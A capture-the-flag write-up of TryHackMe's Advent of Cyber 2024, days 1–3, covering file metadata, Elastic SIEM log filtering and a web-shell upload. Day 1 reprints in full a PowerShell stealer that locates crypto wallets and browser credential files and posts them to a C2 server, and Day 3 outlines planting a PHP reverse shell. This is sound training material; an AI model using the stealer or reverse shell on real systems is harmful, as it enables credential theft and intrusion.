---
title: THM Advent of Cyber 2024
author: hanhctf
date: 2024-12-01 00:00:00 +0000
categories: [Advent of Cyber 2024, THM]
tags: []
toc: true
mermaid: true
---

# [**Advent of Cyber 2024**](https://tryhackme.com/r/room/adventofcyber2024)

Hello all, welcome back to the Advent of Cyber 2024.

## Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?

**Question 1: Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author?**

Run `exiftool song.mp3`, we can see information of the `song.mp3` file.

```shell
┌──(kali㉿kali)-[~/thm/AoC2024/Day1]
└─$ exiftool song.mp3 
ExifTool Version Number         : 13.00
File Name                       : song.mp3
Directory                       : .
File Size                       : 4.6 MB
File Modification Date/Time     : 2024:10:24 09:50:46-04:00
File Access Date/Time           : 2024:12:02 05:34:31-05:00
File Inode Change Date/Time     : 2024:12:02 05:34:12-05:00
File Permissions                : -rwxrwxr-x
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 192 kbps
Sample Rate                     : 44100
Channel Mode                    : Stereo
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 2176
Artist                          : Tyler Ramsbey
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         : 
Date/Time Original              : 2024
Duration                        : 0:03:11 (approx)
```

**Answer 1:** *`...`*

**Question 2:The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?**

Look at the malicious PowerShell script.

```powershell
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

**Answer 2:** *`...`*

**Question 3: Who is M.M? Maybe his Github profile page would provide clues?**

Access the Github profile of [MM-WarevilleTHM](https://github.com/MM-WarevilleTHM), we see:

![](/commons/THM/AoC2024/Day1/0_github.png)

**Answer 3:** *`...`*

**Question 4: What is the number of commits on the GitHub repo where the issue was raised?**

Searching the Source
There are many paths we could take to continue our investigation. We could investigate the website further, analyse its source code, or search for open directories that might reveal more information about the malicious actor's setup. We can search for the hash or signature on public malware databases like VirusTotal or Any.Run. Each of these methods could yield useful clues.

However, for this room, we'll try something a bit different. Since we already have the PowerShell code, searching for it online might give us useful leads. It's a long shot, but we'll explore it in this exercise.

There are many places where we can search for code. The most widely used is Github. So let's try searching there.

To search effectively, we can look for unique parts of the code that we could use to search with. The more distinctive, the better. For this scenario, we have the string we've uncovered before that reads:

**"Created by the one and only M.M."**

![](/commons/THM/AoC2024/Day1/1_github.png)

**Answer 4:** *`...`*

## Day 2: One man's false positive is another man's potpourri

How to use Elastic SIEM.

1. Setup time of the activity occurred.
2. Set up some fields according to the information you want to looking.

    Since we are looking for events related to PowerShell, we would like to know the following details about the logs.
    - The hostname where the command was run. We can use the `host.hostname` field as a column for that.
    - The user who performed the activity. We can add the `user.name` field as a column for this information.
    - We will add the `event.category` field to ensure we are looking at the correct event category.
    - To know the actual commands run using PowerShell, we can add the `process.command_line` field.
    - Finally, to know if the activity succeeded, we will add the `event.outcome` field.
    - Let's also add the `source.ip` field as a column to find out who ran the PowerShell commands.

3. Filter for value.
4. 


**Question 1: What is the name of the account causing all the failed login attempts?**

Add 2 filters:

1. event.category: ...
2. event.outcome: ...

**Answer 1:** *`...`*

**Question 2: How many failed logon attempts were observed?**

Add 3 filters:

1. user.name: ...
2. event.category: ...
3. event.outcome: ...

**Answer 2:** *`...`*

**Question 3: What is the IP address of Glitch?**

Add 4 filters:

1. user.name: ...
2. event.category: ...
3. event.outcome: ...
4. NOT source.ip: ...

**Answer 3:** *`...`*

**Question 4: When did Glitch successfully logon to ADM-01? Format: MMM D, YYYY HH:MM:SS.SSS**

Add 4 filters:

1. user.name: ...
2. event.category: ...
3. NOT source.ip: ...
4. event.outcome: success
**Answer 4:** *`...`*

**Question 5: What is the decoded command executed by Glitch to fix the systems of Wareville?**

Add 2 filters:

1. user.name: ...
2. NOT source.ip: ...
3. Decode powershell encode

**Answer 5:** *`...`*

## Day 3: Even if I wanted to go, their vulnerabilities wouldn't allow it

- Learn about Log analysis and tools like ELK.
- Learn about KQL and how it can be used to investigate logs using ELK.
- Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.


**Question 1: BLUE: Where was the web shell uploaded to?**

Check message: *.php easy to find directory of .php file uploaded.

**Answer 1:** *`...`*

**Question 2: BLUE: What IP address accessed the web shell?**

Trace follow file .php uploaded, we can see IP of web shell.

**Answer 2:** *`...`*

**Question 3: RED: What is the contents of the flag.txt?**

1. Add `MachineIP frostypines.thm` to `/etc/hosts`.
2. Fuzz with `ffuf` to find hidden directory.  
We can access admin without any creds.
3. Create new room with `shell.php`. In my case, I use `Pentestmonkey's reverse shell`.
4. Got the flag.txt

**Answer 3:** *`...`*
